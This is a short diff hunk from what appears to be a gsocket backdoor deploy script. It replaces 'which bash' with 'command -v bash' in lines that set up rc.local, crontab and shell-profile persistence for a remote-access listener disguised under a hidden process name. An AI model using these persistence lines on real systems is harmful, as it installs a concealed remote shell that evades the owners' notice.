@@ -190,10 +190,10 @@ init_setup()
 	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
 	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
-	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(which bash) -c \"cd /root; exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
 
 	PROFILE_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
-	CRONTAB_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(which bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+	CRONTAB_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
 
 	if command -v xxd >/dev/null; then
 		local p
